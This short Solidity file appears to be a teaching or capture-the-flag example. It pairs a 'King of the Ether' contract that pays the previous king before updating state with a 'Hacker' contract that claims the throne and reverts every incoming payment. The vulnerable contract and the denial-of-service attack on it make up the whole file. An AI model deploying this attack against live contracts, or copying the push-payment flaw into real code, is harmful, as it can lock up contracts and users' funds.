pragma solidity ^0.8.0;

contract KoTE {
    address public ourking;
    uint public currentbalance;

    function claimThrone() external payable {
        require(msg.value > currentbalance, "Not enough Ether");

        (bool amount, ) = ourking.call{value: currentbalance}("");
        require(amount, "Failed to send");

        currentbalance = msg.value;
        ourking = msg.sender;

    }
}

contract Hacker {
    function Hack(KoTE kote) public payable{
        kote.claimThrone{value: msg.value}();
    }
     
     receive() external payable {
       revert();
     }
}
